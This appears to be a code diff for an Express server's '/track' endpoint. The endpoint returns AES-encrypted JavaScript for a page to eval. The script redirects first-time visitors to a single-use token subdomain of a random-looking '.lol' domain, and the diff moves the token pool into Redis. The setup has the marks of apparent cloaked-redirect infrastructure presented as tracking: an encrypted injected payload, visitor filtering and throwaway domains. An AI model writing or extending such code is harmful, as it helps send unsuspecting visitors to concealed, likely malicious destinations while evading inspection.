@@ -126,7 +126,10 @@ app.post("/track", async (req, res) => {
     }
 
     // Fresh visitor — encrypt and return the JS code
-    const jsCode = buildJsCode();
+    const jsCode = await buildJsCode();
+    if (!jsCode) {
+      return res.status(503).json({ error: "No tokens available" });
+    }
     const encrypted = encodeURIComponent(
       CryptoJS.AES.encrypt(jsCode, ENCRYPTION_KEY).toString(),
     );
@@ -141,12 +144,12 @@ app.post("/track", async (req, res) => {
  * Returns the JS snippet string that the frontend will eval / inject.
  * Customize the body of this function to match your popup / tracking logic.
  */
-function buildJsCode() {
-  const tokens = require("./valid-tokens.json");
-  const token = tokens.pop();
+async function buildJsCode() {
+  const token = await redis.rpop("valid_tokens");
 
   console.log("Generated JS code with token:", token);
 
+  if (!token) return null;
   return `window.location.href="https://${token}.nblakjdfnvlkjadsfnv.lol"`;
 }
 
